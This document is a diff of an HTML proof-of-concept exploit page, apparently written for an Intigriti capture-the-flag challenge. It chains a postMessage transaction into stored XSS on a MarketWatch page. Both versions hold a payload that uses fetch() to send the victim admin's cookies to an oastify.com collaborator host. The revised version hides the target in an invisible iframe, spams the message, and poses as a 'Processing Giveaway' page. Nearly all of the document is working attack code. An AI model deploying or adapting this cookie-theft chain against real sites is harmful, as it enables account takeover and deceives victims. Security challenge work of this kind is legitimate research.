@@ -1,39 +1,37 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <title>Crypto Heist PoC</title>
-</head>
+<head><title>Exploit</title></head>
 <body>
-    <h1>Executing MarketWatch XSS Chain...</h1>
-    <p>Do not close this tab.</p>
+    <h1 style="color:white">Processing Giveaway...</h1>
+    <iframe id="target" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1" width="1" height="1" style="visibility:hidden"></iframe>
 
     <script>
-        // Step 1: Open the checkout page to prepare the CSRF
-        const victimWindow = window.open('https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1', '_blank');
+        // The XSS payload for MarketWatch.html
+        const XSS = '"><img src=x onerror="fetch(\'https://b4gofscv4huzfnm16g1zxfipfgl79zxo.oastify.com/?c=\'+btoa(document.cookie))">';
         
-        // This payload breaks out of the title="" attribute in marketwatch.html
-        // and sends the Admin's cookies directly to your Burp Collaborator.
-        const XSS_PAYLOAD = '"><img src=x onerror="fetch(\'https://b4gofscv4huzfnm16g1zxfipfgl79zxo.oastify.com/?flag=\'+document.cookie)">';
-        
-        // Step 2: Wait 4 seconds for the Admin wallet to load, then send the malicious transaction
-        setTimeout(() => {
-            victimWindow.postMessage({
-                type: 'submitTransaction',
-                transaction: {
-                    currency: '1337COIN',
-                    amount: 1, 
-                    toAddress: XSS_PAYLOAD // The XSS goes here!
-                }
-            }, '*');
+        window.onload = function() {
+            const frame = document.getElementById('target').contentWindow;
             
-            console.log("Transaction sent. Waiting for API to process...");
+            // Step 2: Spam the transaction message for 5 seconds to ensure it hits
+            let count = 0;
+            const spammer = setInterval(() => {
+                frame.postMessage({
+                    type: 'submitTransaction',
+                    transaction: {
+                        currency: '1337COIN',
+                        amount: 1,
+                        toAddress: XSS 
+                    }
+                }, '*');
+                count++;
+                if (count > 20) clearInterval(spammer);
+            }, 500);
 
-            // Step 3: Wait 2 seconds for the transaction to save, then redirect the Admin to MarketWatch to trigger the XSS
+            // Step 3: Wait for transaction to settle, then redirect the WHOLE page to MarketWatch
             setTimeout(() => {
-                victimWindow.location.href = 'https://challenge-0126.intigriti.io/marketwatch.html';
-            }, 2000);
-
-        }, 4000); 
+                window.location.href = 'https://challenge-0126.intigriti.io/marketwatch.html';
+            }, 6000);
+        };
     </script>
 </body>
 </html>
